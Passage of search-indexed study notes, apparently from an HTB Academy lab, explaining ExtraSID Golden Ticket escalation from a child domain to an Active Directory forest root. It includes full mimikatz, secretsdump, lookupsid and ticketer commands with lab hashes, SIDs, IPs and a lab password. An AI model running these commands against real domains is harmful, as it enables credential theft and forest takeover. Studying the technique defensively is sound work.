relationship itself . Domain Controllers store trust settings in AD. Admin can view it using: Active Directory Domains and Trusts Or PowerShell. Example: Get-ADTrust Important attribute: SIDFilteringForestAware"},{"id":"what-happens-during-authentication-why-the-attack-works","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-happens-during-authentication-why-the-attack-works","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"8️⃣ What Happens During Authentication (Why the Attack Works)","c":"When a parent DC receives authentication from a child domain: Child domain authenticates user │ ▼ Kerberos ticket contains SIDs │ ▼ Parent domain builds access token If SID filtering is disabled: Parent DC keeps all SIDs Example ticket: User: hacker Domain: LOGISTICS SIDs: LOGISTICS\\Domain Users INLANEFREIGHT\\Enterprise Admins Parent DC sees: Enterprise Admin SID present Result: User treated as Enterprise Admin"},{"id":"how-the-domain-controller-disables-sid-filtering","u":"04_forest-privilege-escalation-trust-abuse-technique.html#how-the-domain-controller-disables-sid-filtering","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"9️⃣ How the Domain Controller “Disables” SID Filtering","c":"For parent-child trusts , AD sets it automatically. When the child domain is created: TrustDirection = Bidirectional TrustType = ParentChild SIDFiltering = Disabled Reason: SIDHistory must work across forest domains So AD allows foreign SIDs from trusted domains ."},{"id":"example","u":"04_forest-privilege-escalation-trust-abuse-technique.html#example","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Example","c":""},{"id":"attack-goal","u":"04_forest-privilege-escalation-trust-abuse-technique.html#attack-goal","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🎯 Attack Goal","c":"Escalate privileges: Child Domain → Parent Domain By forging a Golden Ticket with ExtraSID ."},{"id":"attack-pathway-diagram","u":"04_forest-privilege-escalation-trust-abuse-technique.html#attack-pathway-diagram","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧱 Attack Pathway Diagram","c":"Active Directory Forest: INLANEFREIGHT.LOCAL ▲ │ ┌────────────────┴────────────────┐ │ │ Child Domain (LOGISTICS) Parent Domain (INLANEFREIGHT) │ │ Compromised User Account Enterprise Admin Group │ ▲ └────────────── SID Injection ────┘ ExtraSID"},{"id":"requirements","u":"04_forest-privilege-escalation-trust-abuse-technique.html#requirements","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📌 Requirements","c":"Requirement | Purpose | — | — | Child domain KRBTGT hash | Sign forged ticket | Child domain SID | Build ticket identity | Child domain name | Kerberos realm | Username | Identity inside TGT | Parent Enterprise Admin SID | ExtraSID privilege escalation |"},{"id":"step-1-dump-krbtgt-hash-child-domain","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-1-dump-krbtgt-hash-child-domain","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧪 Step 1 — Dump KRBTGT Hash (Child Domain)","c":"mimikatz lsadump::dcsync/user:LOGISTICS\\krbtgt Purpose: Retrieve KRBTGT secret key Example output: Hash NTLM: 9d765b482771505cbe97411065964d5f This key is used to sign forged Kerberos tickets ."},{"id":"step-2-get-child-domain-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-2-get-child-domain-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧪 Step 2 — Get Child Domain SID","c":"Get-DomainSID Output: S-1-5-21-2806153819-209893948-922872689 This builds the user SID in the forged ticket ."},{"id":"step-3-get-parent-enterprise-admin-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-3-get-parent-enterprise-admin-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧪 Step 3 — Get Parent Enterprise Admin SID","c":"Get-DomainGroup-Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" Output: S-1-5-21-3842939050-3880317879-2865463114-519 Important part: RID 519 = Enterprise Admins This SID will be injected."},{"id":"step-4-confirm-no-access","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-4-confirm-no-access","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🛑 Step 4 — Confirm No Access","c":"ls \\\\academy-ea-dc01.inlanefreight.local\\c$ Output: Access is denied Attacker has no parent domain privileges yet ."},{"id":"step-5-forge-golden-ticket-with-extrasid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-5-forge-golden-ticket-with-extrasid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🎟️ Step 5 — Forge Golden Ticket with ExtraSID","c":"mimikatz kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt"},{"id":"what-this-command-actually-does","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-this-command-actually-does","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔍 What This Command Actually Does","c":"Creates a forged TGT containing : User: hacker Domain: LOGISTICS Primary SID: Child domain SID ExtraSID: Enterprise Admins (Parent) Kerberos ticket now contains: User SID + Enterprise Admin SID So when authentication occurs: Authorization token includes Enterprise Admin"},{"id":"step-6-verify-ticket","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-6-verify-ticket","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📄 Step 6 — Verify Ticket","c":"klist Output: Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL Ticket is now in memory ."},{"id":"step-7-access-parent-domain-dc","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-7-access-parent-domain-dc","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🗂️ Step 7 — Access Parent Domain DC","c":"ls \\\\academy-ea-dc01.inlanefreight.local\\c$ Now access works. Why? Because the authorization token contains Enterprise Admin SID ."},{"id":"step-8-confirm-privilege-with-dcsync","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-8-confirm-privilege-with-dcsync","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📤 Step 8 — Confirm Privilege with DCSync","c":"mimikatz lsadump::dcsync/user:INLANEFREIGHT\\lab_adm Output: NTLM Hash: 663715a1a8b957e8e9943cc98ea451b6 This proves: Attacker = Enterprise Admin"},{"id":"example---2","u":"04_forest-privilege-escalation-trust-abuse-technique.html#example---2","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Example - 2","c":""},{"id":"forest-setup","u":"04_forest-privilege-escalation-trust-abuse-technique.html#forest-setup","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🌳 Forest Setup","c":"Example forest: INLANEFREIGHT.LOCAL (Parent / Root Domain) │ ├── LOGISTICS.INLANEFREIGHT.LOCAL (Child Domain) │ └── HR.INLANEFREIGHT.LOCAL (Child Domain) Trust properties: ✔ Two-way ✔ Transitive ✔ Automatic ✔ SID Filtering Disabled (intra-forest) Meaning: Parent domain accepts SIDs coming from child domains"},{"id":"attacker-position","u":"04_forest-privilege-escalation-trust-abuse-technique.html#attacker-position","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔑 Attacker Position","c":"Attacker compromised child domain : LOGISTICS.INLANEFREIGHT.LOCAL Attacker obtains: Child Domain SID Child KRBTGT Hash Now attacker can forge Kerberos TGTs ."},{"id":"forged-golden-ticket-structure","u":"04_forest-privilege-escalation-trust-abuse-technique.html#forged-golden-ticket-structure","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🎟 Forged Golden Ticket Structure","c":"Example forged ticket: User: hacker Domain: LOGISTICS.INLANEFREIGHT.LOCAL Primary SID S-1-5-21-LOGISTICS-1105 ExtraSID S-1-5-21-INLANEFREIGHT-519 Where: 519 = Enterprise Admin So the ticket claims: \"hacker\" ∈ Enterprise Admins"},{"id":"scenario-1-existing-user","u":"04_forest-privilege-escalation-trust-abuse-technique.html#scenario-1-existing-user","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔎 Scenario 1 — Existing User","c":"User exists in child domain. Example: LOGISTICS\\john Attack flow: Attacker │ │ Forge TGT for john │ Add ExtraSID (Enterprise Admin) ▼ Golden Ticket Ticket content: User: john SID: LOGISTICS-1105 ExtraSID: INLANEFREIGHT-519 Now authentication flow: john → Parent DC requests TGS DC logic: ✔ Ticket signature valid ✔ Issued by trusted domain ✔ SID filtering disabled Resulting token: User: LOGISTICS\\john Groups: LOGISTICS\\Domain Users INLANEFREIGHT\\Enterprise Admins Result: john becomes Enterprise Admin in parent domain"},{"id":"scenario-2-non-existing-user","u":"04_forest-privilege-escalation-trust-abuse-technique.html#scenario-2-non-existing-user","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔎 Scenario 2 — Non-Existing User","c":"This is the interesting one. Attacker creates fake identity . User: hacker123 This user does NOT exist in AD . Forged ticket: User: hacker123 Domain: LOGISTICS Primary SID S-1-5-21-LOGISTICS-5000 ExtraSID S-1-5-21-INLANEFREIGHT-519 Signed with: KRBTGT hash of LOGISTICS"},{"id":"why-this-still-works","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-this-still-works","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧠 Why This Still Works","c":"Because Kerberos trusts the ticket, not the user object . The authentication stage was already “completed”. Golden Ticket skips the AS-REQ stage . Normal Kerberos flow: AS-REQ → Authentication TGS-REQ → Authorization Golden Ticket starts directly at: TGS-REQ"},{"id":"actual-authentication-flow","u":"04_forest-privilege-escalation-trust-abuse-technique.html#actual-authentication-flow","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔄 Actual Authentication Flow","c":"Attacker accesses resource on parent domain: \\\\DC01.INLANEFREIGHT.LOCAL\\C$ Kerberos interaction: Attacker │ │ Present forged TGT ▼ Parent Domain Controller DC verification: ✔ Ticket signature valid ✔ Ticket issued by trusted child domain ✔ Ticket lifetime valid The DC does NOT do this check : ❌ Does user \"hacker123\" exist? Because it assumes: Authentication already happened in child domain"},{"id":"token-creation-inside-parent-dc","u":"04_forest-privilege-escalation-trust-abuse-technique.html#token-creation-inside-parent-dc","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"⚙️ Token Creation Inside Parent DC","c":"The DC reads authorization data inside ticket . Primary SID → LOGISTICS-5000 Extra SID → INLANEFREIGHT-519 Token generated: User: LOGISTICS\\hacker123 Groups: INLANEFREIGHT\\Enterprise Admins Authorization decision: if token contains Enterprise Admin SID allow privileged access Result: Access granted"},{"id":"resource-access-example","u":"04_forest-privilege-escalation-trust-abuse-technique.html#resource-access-example","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔓 Resource Access Example","c":"Attacker connects to: \\\\DC01.INLANEFREIGHT.LOCAL\\C$ Server receives token: LOGISTICS\\hacker123 Enterprise Admin Access check: Enterprise Admin → Full privileges Result: Attacker controls parent domain"},{"id":"why-child-domain-can-escalate-to-parent","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-child-domain-can-escalate-to-parent","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔗 Why Child Domain Can Escalate to Parent","c":"Because of trust relationship . Trust rule: Parent trusts authentication from child domain So when the ticket says: Issued by LOGISTICS KDC Parent assumes: LOGISTICS domain already verified this user And since SID filtering is disabled : ExtraSID is preserved So parent accepts: Enterprise Admin SID"},{"id":"example---3","u":"04_forest-privilege-escalation-trust-abuse-technique.html#example---3","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Example - 3","c":""},{"id":"extra-sid-attack-is-usually-used-for","u":"04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack-is-usually-used-for","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Extra SID Attack Is Usually Used For","c":"1. Forest Privilege Escalation ⭐ Most common use case. Child Domain Compromised ↓ Get Child KRBTGT ↓ Forge Ticket ↓ Add Parent EA SID in ExtraSIDs ↓ Become Enterprise Admin This is where Extra SID attacks became famous."},{"id":"trust-abuse","u":"04_forest-privilege-escalation-trust-abuse-technique.html#trust-abuse","sec":"Forest privilege escalation / trust abuse technique","lvl":4,"t":"2. Trust Abuse","c":"Suppose: child.corp.local ↔ corp.local Attacker controls: child.corp.local Extra SID allows: Child User ↓ PAC contains Enterprise Admin SID ↓ Parent Domain Trusts SID ↓ Escalation"},{"id":"chained-after-dcsync","u":"04_forest-privilege-escalation-trust-abuse-technique.html#chained-after-dcsync","sec":"Forest privilege escalation / trust abuse technique","lvl":4,"t":"3. Chained After DCSync","c":"Common HTB chain: Low User ↓ Kerberoast ↓ DA ↓ DCSync ↓ KRBTGT ↓ Golden Ticket ↓ Extra SID Attack ↓ Enterprise Admin"},{"id":"common-chains","u":"04_forest-privilege-escalation-trust-abuse-technique.html#common-chains","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Common Chains","c":"Chain 1 - Child → Forest Root Classic exam scenario. Compromise Child Domain ↓ DCSync Child KRBTGT ↓ Extra SID Attack ↓ Add Root Enterprise Admin SID ↓ Forest Compromise Chain 2 - Golden Ticket + Extra SID KRBTGT Hash ↓ Forge Golden Ticket ↓ Insert Extra SID ↓ Cross Domain Privilege Escalation The Extra SID is simply another field inside the forged PAC. Chain 3 - Diamond Ticket + Extra SID Legitimate TGT ↓ Modify PAC ↓ Add Enterprise Admin SID ↓ Re-sign PAC Same idea."},{"id":"golden-ticket-extra-sid-poc---windows","u":"04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-extra-sid-poc---windows","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Golden Ticket + Extra SID PoC - Windows","c":"Step 1 - rdp to windows machine xfreerdp /u:htb-student_adm /p:‘HTB_ @cademy_stdnt_admin !’ /v:10.129.232.164 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution Step 2 - run mimikatz to get the ntml hash of krbtgt ..exe # lsadump::dcsync /user:LOGISTICS Credentials: Hash NTLM: 9d765b482771505cbe97411065964d5f ntlm- 0: 9d765b482771505cbe97411065964d5f lm - 0: 69df324191d4a80f0ed100c10f20561e image.png Step 3 - getting the sid of child domain S-1-5-21-2806153819-209893948-922872689 Step 4 - getting the sid of Enterprise Admins S-1-5-21-3842939050-3880317879-2865463114-519 At this point, we have gathered the following data points: The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f The SID for the child domain: S-1-5-21-2806153819-209893948-922872689 The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We’ll choose a fake user: hacker The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519 Step 5 - run mimikatz ..exe kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt image.png image.png Step 6 - list the content on C: drive and read the flag file ls \\academy-ea-dc01.inlanefreight.local$ type “\\academy-ea-dc01.inlanefreight.local$.txt image.png"},{"id":"golden-ticket-extra-sid-poc---linux","u":"04_forest-privilege-escalation-trust-abuse-technique.html#golden-ticket-extra-sid-poc---linux","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Golden Ticket + Extra SID PoC - Linux","c":"Step 1 - ssh to linux machine Step 2- get the hash of krbtgt secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt password - HTB_ @cademy_stdnt_admin ! krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: image.png Step 3 - grab the sid of domain lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep “Domain SID” S-1-5-21-2806153819-209893948-922872689 image.png Step 4 - get the sid of enterprise admin lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 “Enterprise Admins” image.png Step 5 - perform the attack using ticketer.py tool ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker image.png Step 6 - run secretsdump to get the hash of user bross impacket-secretsdump -just-dc-user bross -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 image.png"},{"id":"extra-sid-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#extra-sid-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":2,"t":"Extra Sid Attack","c":""},{"id":"understanding-the-core-concept","u":"04_forest-privilege-escalation-trust-abuse-technique.html#understanding-the-core-concept","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"big-picture-first-one-sentence","u":"04_forest-privilege-escalation-trust-abuse-technique.html#big-picture-first-one-sentence","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧠 Big Picture First (One Sentence)","c":"This attack works because Kerberos trusts the PAC issued by a trusted domain, and Windows authorization blindly honors ExtraSIDs (SIDHistory) when SID filtering is not enforced inside a forest. Everything else is mechanics."},{"id":"requirements-1","u":"04_forest-privilege-escalation-trust-abuse-technique.html#requirements-1","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📌 Requirements:","c":"Requirement | Purpose | — | — | KRBTGT NTLM hash (child) | Create Golden Ticket | Child domain SID | Needed to build the ticket | FQDN of child domain | Domain name of forged ticket | Username (can be fake) | Username inside forged TGT | Parent Domain Enterprise Admins SID | Added as ExtraSID (grants full forest access) |"},{"id":"prerequisites-for-sid-history-extrasid-child-parent-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#prerequisites-for-sid-history-extrasid-child-parent-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Prerequisites for SID History / ExtraSID (Child → Parent) Attack","c":""},{"id":"child-domain-must-be-compromised-critical","u":"04_forest-privilege-escalation-trust-abuse-technique.html#child-domain-must-be-compromised-critical","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"1️⃣ Child Domain Must Be Compromised (Critical)","c":"You must already have high privilege in the child domain . Required capability: Ability to DCSync the child domain This usually means: Domain Admin OR Equivalent replication privileges 👉 Without child-domain compromise, the attack is impossible."},{"id":"child-domain-krbtgt-hash","u":"04_forest-privilege-escalation-trust-abuse-technique.html#child-domain-krbtgt-hash","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"2️⃣ Child Domain KRBTGT Hash","c":"Why it is required: Used to cryptographically sign the forged Golden Ticket Parent domain trusts tickets signed by child KRBTGT (due to forest trust) How it’s obtained: DCSync against krbtgt in child domain 👉 This is the core cryptographic requirement."},{"id":"intra-forest-trust-relationship","u":"04_forest-privilege-escalation-trust-abuse-technique.html#intra-forest-trust-relationship","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"3️⃣ Intra-Forest Trust Relationship","c":"The child and parent must be in the same Active Directory forest . Required trust properties: Transitive Bidirectional Automatic (default inside forest) Why: Parent domain accepts Kerberos tickets issued by child domain ❌ External trust alone is not sufficient ."},{"id":"sid-filtering-must-be-disabled-default-in-forest","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sid-filtering-must-be-disabled-default-in-forest","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"4️⃣ SID Filtering Must Be Disabled (Default in Forest)","c":"Why: SID filtering removes foreign high-privilege SIDs Inside a forest, SID filtering is disabled by default Effect: ExtraSID (Enterprise Admin SID) is accepted without validation 👉 This is the authorization flaw being abused."},{"id":"child-domain-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#child-domain-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"5️⃣ Child Domain SID","c":"Purpose: Required to construct a valid child-domain identity Used as the base SID of the forged ticket Without this: Ticket structure is invalid"},{"id":"parent-domain-enterprise-admin-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#parent-domain-enterprise-admin-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"6️⃣ Parent Domain Enterprise Admin SID","c":"Purpose: Injected as ExtraSID into the Kerberos PAC Grants forest-wide administrative privileges Important: Only the SID value is required No group membership or AD modification needed"},{"id":"any-username-existing-or-fake","u":"04_forest-privilege-escalation-trust-abuse-technique.html#any-username-existing-or-fake","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"7️⃣ Any Username (Existing or Fake)","c":"Important clarification: User does NOT need to exist Kerberos does not verify user existence for a signed TGT Why this works: Authorization is SID-based, not object-based"},{"id":"what-is-actually-being-abused-here","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-is-actually-being-abused-here","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"1️⃣ What Is Actually Being Abused Here?","c":"This is NOT a vulnerability in: Mimikatz Kerberos crypto NTLM hashes This is an abuse of: Component | What’s abused | — | — | SIDHistory | SIDs are trusted without origin validation | Kerberos PAC | Contains authorization data, not validated cross-domain | Intra-forest trust | SID filtering disabled by default | Authorization model | Token-based, SID-based |"},{"id":"sidhistory-vs-extrasid-critical-clarification","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sidhistory-vs-extrasid-critical-clarification","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"2️⃣ SIDHistory vs ExtraSID (Critical Clarification)","c":""},{"id":"important-distinction","u":"04_forest-privilege-escalation-trust-abuse-technique.html#important-distinction","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Important distinction:","c":"Term | Where it lives | — | — | sidHistory attribute | Stored in AD user object | ExtraSID | Lives inside Kerberos PAC | ⚠️ Golden Ticket does NOT modify AD objects It injects SIDHistory logically , not physically. 👉 ExtraSID in a forged ticket behaves exactly like sidHistory during authorization."},{"id":"why-trust-is-the-core-requirement","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-trust-is-the-core-requirement","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"3️⃣ Why Trust Is the Core Requirement","c":"🔗 Intra-Forest Trust Model Inside a forest: ChildDomain ───(Transitive Trust)───> ParentDomain Key properties: Trust is automatic Trust is bidirectional Trust is transitive SID Filtering = DISABLED 💥 This last point is why the attack works."},{"id":"why-sid-filtering-is-disabled","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-sid-filtering-is-disabled","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔍 Why SID Filtering Is Disabled","c":"SID filtering is disabled by design to support: Account migrations SIDHistory usage Legacy access preservation Microsoft assumed: “Only trusted admins exist inside a forest” This assumption fails once a child domain is compromised ."},{"id":"where-the-attack-lives-in-kerberos-very-important","u":"04_forest-privilege-escalation-trust-abuse-technique.html#where-the-attack-lives-in-kerberos-very-important","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"4️⃣ Where the Attack Lives in Kerberos (Very Important)","c":"This attack abuses authorization , not authentication."},{"id":"kerberos-phases","u":"04_forest-privilege-escalation-trust-abuse-technique.html#kerberos-phases","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Kerberos phases:","c":"Authentication Authorization This attack happens after authentication succeeds ."},{"id":"kerberos-ticket-internals-pac-explained-simply","u":"04_forest-privilege-escalation-trust-abuse-technique.html#kerberos-ticket-internals-pac-explained-simply","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"5️⃣ Kerberos Ticket Internals (PAC Explained Simply)","c":"Every TGT contains a PAC (Privilege Attribute Certificate) . PAC contains: User SID Group SIDs ExtraSIDs (SIDHistory) Privileges Domain info When you forge a Golden Ticket, you control: PAC → AuthorizationIdentity The KDC does not re-validate PAC contents for trusted domains."},{"id":"why-the-child-krbtgt-hash-is-enough","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-the-child-krbtgt-hash-is-enough","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"6️⃣ Why the Child KRBTGT Hash Is Enough","c":"Key misunderstanding people have: “Why does child KRBTGT allow parent access?” Because: The parent domain trusts tickets signed by the child Signature validation ≠ authorization validation Flow: Parent DC: ✔ Signaturevalid(child krbtgt) ✔ Domain trusted ❌ Does NOT validate ExtraSID origin 👉 Ticket accepted."},{"id":"example-1","u":"04_forest-privilege-escalation-trust-abuse-technique.html#example-1","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Example","c":""},{"id":"step-by-step-what-logically-happens-during-the-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-by-step-what-logically-happens-during-the-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"7️⃣ Step-by-Step: What Logically Happens During the Attack","c":"Let’s walk it exactly as Windows sees it . 🧩 Step 1: Child Domain Is Compromised Attacker already has: DCSync rights in child KRBTGT hash This is post-compromise escalation , not initial access. 🧩 Step 2: Attacker Forges a TGT They create a TGT with: Fake username Valid child domain SID Signed with child KRBTGT hash So far: Ticket is 100% valid cryptographically 🧩 Step 3: ExtraSID Is Added Attacker inserts: Parent Enterprise Admin SID This goes into: PAC → ExtraSIDs[] At this point: No AD object modified No sidHistory attribute touched 🧩 Step 4: Ticket Is Injected (PTT) The forged TGT is loaded into LSASS. From Windows’ view: User authenticated successfully 🧩 Step 5: Accessing Parent Domain Resource When attacker accesses: \\\\parent-dc\\c$ Parent DC performs: ✔ Authentication Ticket signature valid Trust exists ✔ Authorization Extract PAC Build access token Token contains: User SID (child) + ExtraSID (Enterprise Admin) 🧩 Step 6: Authorization Decision ACL on parent DC: Allow: Enterprise Admins Token check: Does tokencontain EA SID? → YES (ExtraSID) → ACCESS GRANTED 💥 No group membership check 💥 No SID origin validation 💥 No alert by default"},{"id":"why-this-is-called-sid-history-priming","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-this-is-called-sid-history-priming","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"8️⃣ Why This Is Called “SID History Priming”","c":"Because: You are pre-loading authorization SIDs Before any access check Without modifying AD It’s logical SIDHistory , not physical."},{"id":"why-this-enables-dcsync-in-parent-domain","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-this-enables-dcsync-in-parent-domain","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"9️⃣ Why This Enables DCSync in Parent Domain","c":"DCSync checks: Does caller have Replication privileges? Enterprise Admins: Have replication rights forest-wide Since the EA SID exists in token : DCSync allowed This completes forest compromise ."},{"id":"why-the-username-isnt-re-checked","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-the-username-isnt-re-checked","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Why the Username Isn’t Re-checked","c":"Once a ticket is issued, the system assumes: The KDC already validated this user earlier So the service server only checks: ✔ Ticket signature ✔ Ticket validity time ✔ Authorization SIDs Not: ❌ Does the user object exist? Because the KDC is the source of truth . Golden Ticket works because attackers steal the KDC signing key (KRBTGT) and impersonate it."},{"id":"why-this-attack-is-so-powerful","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-this-attack-is-so-powerful","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔥 Why This Attack Is So Powerful","c":"Reason | Impact | — | — | No AD modification | Very stealthy | Uses valid crypto | No ticket tampering alerts | Works intra-forest | Child → Parent escalation | Persistent | Until KRBTGT reset |"},{"id":"why-external-trusts-usually-block-this","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-external-trusts-usually-block-this","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🛡️ Why External Trusts Usually Block This","c":"External trusts: Have SID filtering enabled Strip foreign high-privilege SIDs So: ExtraSID removed → attack fails This is why forest trust context matters ."},{"id":"mental-model-lock-keys","u":"04_forest-privilege-escalation-trust-abuse-technique.html#mental-model-lock-keys","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧠 Mental Model (Lock & Keys)","c":"Golden Ticket =Valid passport ExtraSID = VIPaccess badge Trust = Border agreement SID filtering =Securitycheckpoint Nocheckpoint + VIP badge = unrestrictedaccess"},{"id":"final-attack-logic-recap-pure-logic","u":"04_forest-privilege-escalation-trust-abuse-technique.html#final-attack-logic-recap-pure-logic","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🧾 Final Attack Logic Recap (Pure Logic)","c":"Forest trust allows child tickets SID filtering disabled PAC includes ExtraSID Authorization trusts PAC ACL matches SID Access granted Domain escalated"},{"id":"sid-history-kerberos-pac","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sid-history-kerberos-pac","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Sid History & Kerberos Pac","c":""},{"id":"sidhistory-the-active-directory-attribute","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sidhistory-the-active-directory-attribute","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"1️⃣ sidHistory — the Active Directory attribute","c":"What it is sidHistory is a real, legitimate, multi-valued AD attribute on user and computer objects . Purpose (legitimate): Preserve access during account/domain migrations Allow users to keep access to resources secured with old SIDs Key point: sidHistory does nothing by itself — it only becomes effective during logon. Where it lives Stored in AD database ( NTDS.dit ) On objects like: CN=User,CN=Users,DC=domain,DC=local Contains one or more old SIDs Example conceptual value: sidHistory: S-1-5-21-OLD-DOMAIN-1001 S-1-5-21-OLD-DOMAIN-512"},{"id":"what-windows-does-with-sidhistory","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-windows-does-with-sidhistory","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"What Windows does with sidHistory","c":"When a user authenticates: KDC reads the user object Finds sidHistory values Treats them as additional identities Forwards them into the Kerberos authorization data ⚠️ No privilege check is done on the SID values 